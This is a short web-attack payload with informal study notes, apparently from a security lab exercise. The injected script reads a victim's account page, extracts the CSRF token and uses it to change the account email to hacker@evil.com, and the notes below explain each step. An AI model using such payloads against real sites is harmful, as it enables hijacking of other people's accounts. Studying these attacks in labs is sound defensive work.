<script>
fetch('/my-account')
  .then(response => response.text()) // 1. Get the HTML of the account page
  .then(html => {
    // 2. Extract the CSRF token using regex
    const token = html.match(/name="csrf" value="(\w+)"/)[1];
    
    // 3. Use that token to perform the email change
    fetch('/my-account/change-email', {
        method: 'POST',
        mode: 'no-cors', // Bypasses simple security checks
        body: 'csrf=' + token + '&email=hacker@evil.com'
    });
  });
</script>
```

so what this code does 

-first it goes to /my-account page

-then extract the cstf token using html.match and assign it to const token variable

-then use fetch one more time to send a post request to /my-account/change-email endpoint using the csrf token u extracted and the new email u want to assign
